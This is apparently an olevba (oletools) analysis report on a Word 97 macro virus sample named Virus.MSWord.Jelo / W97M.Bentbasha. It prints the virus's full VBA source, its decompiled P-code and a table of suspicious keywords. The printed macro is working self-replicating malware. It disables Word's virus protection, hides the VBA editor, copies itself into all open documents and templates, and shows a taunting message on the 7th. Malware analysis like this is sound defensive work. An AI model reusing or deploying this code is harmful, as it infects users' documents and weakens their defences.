olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jelo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jelo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Bentbasha
Private Sub Document_New(): Document_Close: End Sub
Private Sub Document_Open(): Document_Close: End Sub
Private Sub Document_Close(): On Error Resume Next: c = c + 1
Word.Options.VirusProtection = False
Word.Application.EnableCancelKey = wdCancelDisabled
Word.ActiveDocument.ReadOnlyRecommended = False
Word.ShowVisualBasicEditor = False
If Dir("c:\Windows\Acaid32.drv") <> "Acaid32.drv" Then
Set vtijelo = ThisDocument.VBProject.VBComponents(c)
vtijelo.Export ("c:\System.drv")
End If
For t = 1 To Word.Documents.Count
Set f = Word.ActiveWindow.Document.VBProject.VBComponents(t).CodeModule
If f.lines(c, c) <> "'Bentbasha" Then
f.deletelines c, f.countoflines
f.AddFromFile "C:\System.drv"
f.deletelines 1, 4
End If
Next
For g = 1 To Word.Templates.Count
Set n = Templates(1).VBProject.VBComponents(1).CodeModule
If n.lines(1, 1) <> "'Bentbasha" Then
n.AddFromFile "c:\system.drv"
n.deletelines 1, 4
End If
Next
If Day(Now()) = 7 Then
app = Shell(notepad.exe, vbNormalFocus)
SendKeys "Nazalost, Vas kompjuter je inficiran sa W97M.Bentbasha by e[ax] / SpeciesVL!", 0
AppActivate (app)
End If
End Sub
'WM.Bentbasha by e[ax]

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Jelo
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 4725 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0009 "Bentbasha"
' Line #1:
' 	FuncDefn (Private Sub Document_New())
' 	BoS 0x0000 
' 	ArgsCall Document_Close 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' 	BoS 0x0000 
' 	ArgsCall Document_Close 0x0000 
' 	BoS 0x0000 
' 	EndSub 
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' 	BoS 0x0000 
' 	OnError (Resume Next) 
' 	BoS 0x0000 
' 	Ld c 
' 	LitDI2 0x0001 
' 	Add 
' 	St c 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Word 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Word 
' 	MemLd Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Word 
' 	MemLd ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Word 
' 	MemSt ShowVisualBasicEditor 
' Line #8:
' 	LitStr 0x0016 "c:\Windows\Acaid32.drv"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000B "Acaid32.drv"
' 	Ne 
' 	IfBlock 
' Line #9:
' 	SetStmt 
' 	Ld c 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set vtijelo 
' Line #10:
' 	LitStr 0x000D "c:\System.drv"
' 	Paren 
' 	Ld vtijelo 
' 	ArgsMemCall Export 0x0001 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	StartForVariable 
' 	Ld t 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Word 
' 	MemLd Documents 
' 	MemLd Count 
' 	For 
' Line #13:
' 	SetStmt 
' 	Ld t 
' 	Ld Word 
' 	MemLd ActiveWindow 
' 	MemLd Document 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set F 
' Line #14:
' 	Ld c 
' 	Ld c 
' 	Ld F 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x000A "'Bentbasha"
' 	Ne 
' 	IfBlock 
' Line #15:
' 	Ld c 
' 	Ld F 
' 	MemLd countoflines 
' 	Ld F 
' 	ArgsMemCall AddFromFile 0x0002 
' Line #16:
' 	LitStr 0x000D "C:\System.drv"
' 	Ld F 
' 	ArgsMemCall norm 0x0001 
' Line #17:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld F 
' 	ArgsMemCall AddFromFile 0x0002 
' Line #18:
' 	EndIfBlock 
' Line #19:
' 	StartForVariable 
' 	Next 
' Line #20:
' 	StartForVariable 
' 	Ld _B_var_g 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Word 
' 	MemLd n 
' 	MemLd Count 
' 	For 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd n 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set _B_var_n 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld _B_var_n 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x000A "'Bentbasha"
' 	Ne 
' 	IfBlock 
' Line #23:
' 	LitStr 0x000D "c:\system.drv"
' 	Ld _B_var_n 
' 	ArgsMemCall norm 0x0001 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	Ld _B_var_n 
' 	ArgsMemCall AddFromFile 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' 	ArgsLd Shell 0x0000 
' 	ArgsLd Now 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	Ld _B_var_notepad 
' 	MemLd vbNormalFocus 
' 	Ld SendKeys 
' 	ArgsLd notepad 0x0002 
' 	St app 
' Line #29:
' 	LitStr 0x004C "Nazalost, Vas kompjuter je inficiran sa W97M.Bentbasha by e[ax] / SpeciesVL!"
' 	LitDI2 0x0000 
' 	ArgsCall AppActivate 0x0002 
' Line #30:
' 	Ld app 
' 	Paren 
' 	ArgsCall id_02BA 0x0001 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	EndSub 
' Line #33:
' 	QuoteRem 0x0000 0x0015 "WM.Bentbasha by e[ax]"
' Line #34:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |notepad.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

